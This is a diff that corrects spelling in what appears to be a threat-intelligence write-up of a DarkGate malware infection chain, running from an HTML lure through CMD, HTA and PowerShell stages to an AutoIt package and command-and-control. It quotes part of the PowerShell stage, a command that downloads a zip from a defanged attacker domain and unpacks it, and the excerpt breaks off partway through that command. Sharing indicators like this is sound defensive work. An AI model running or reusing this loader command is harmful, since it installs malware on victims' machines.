@@ -9,7 +9,7 @@ INITIAL REFERENCES:
 INFECTION CHAIN:
 
 - unknown source --> HTML file --> victim runs CMD script from HMTL file --> downloads & runs HTA file -->
-  retreives & runs PowerShell script --> Retreives & runs Autoitv3 package for DarkGate --> DarkGate C2
+  retrieves & runs PowerShell script --> Retrieves & runs Autoitv3 package for DarkGate --> DarkGate C2
 
 13 EXAMPLES OF HTML FILES USED FOR THIS INFECTION CHAIN:
 
@@ -50,7 +50,7 @@ DOWNLOADED HTA FILE:
 - Saved file location: C:\Users\Public\[two random ASCII characters].hta
 - File description: HTA file to download Powershell script 
 
-POWERSHELL SCRIPT RETREIVED BY ABOVE HTA FILE:
+POWERSHELL SCRIPT RETRIEVED BY ABOVE HTA FILE:
 
 - ni 'C:/nkll/' -Type Directory -Force;cd 'C:/nkll/';Invoke-WebRequest -Uri 
   "hxxp://flexiblemaria[.]com/iinkqrwu" -OutFile 'file.zip';Expand-Archive -Path 'file.zip' 
